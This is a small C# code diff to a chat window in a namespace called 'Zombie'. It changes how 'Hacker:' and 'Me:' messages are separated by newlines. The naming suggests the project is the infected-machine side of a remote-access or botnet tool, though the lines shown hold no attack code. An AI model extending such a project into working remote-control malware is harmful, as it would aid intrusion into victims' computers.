@@ -22,6 +22,7 @@ namespace Zombie
 
         public static bool IsOpen = false;
         private string id;
+        private bool firstMsg = true;
 
         public ChatForm(string id)
         {
@@ -34,7 +35,23 @@ namespace Zombie
         private void OnMessageReceived(object sender, EventArgs e)
         {
             MessageArgs args = e as MessageArgs;
-            this.Invoke(new MethodInvoker(() => { chatOutputTextBox.AppendText("Hacker: " + args.Message + Environment.NewLine); }));
+            
+
+            this.Invoke(new MethodInvoker(() => {
+
+                if (firstMsg)
+                {
+                    chatOutputTextBox.AppendText("Hacker: " + args.Message);
+                    firstMsg = false;
+                }
+
+                else
+                {
+                    chatOutputTextBox.AppendText(Environment.NewLine + "Hacker: " + args.Message);
+                   
+                }
+            
+            }));
 
         }
 
@@ -49,7 +66,16 @@ namespace Zombie
             if (!string.IsNullOrWhiteSpace(chatInputTextBox.Text) && e.KeyCode == Keys.Enter && chatInputTextBox.Text.Length <= 512)
             {
                 string text = chatInputTextBox.Text;
-                chatOutputTextBox.AppendText("Me: " + text + Environment.NewLine);
+                if (firstMsg)
+                {
+                    chatOutputTextBox.AppendText("Me: " + text);
+                    firstMsg = false;
+                }
+                else
+                {
+                    chatOutputTextBox.AppendText(Environment.NewLine + "Me: " + text);
+                }
+                
                 Client.Send(ChatMessage.Create(text, id));
                 chatInputTextBox.Text = "";
                 e.Handled = true;
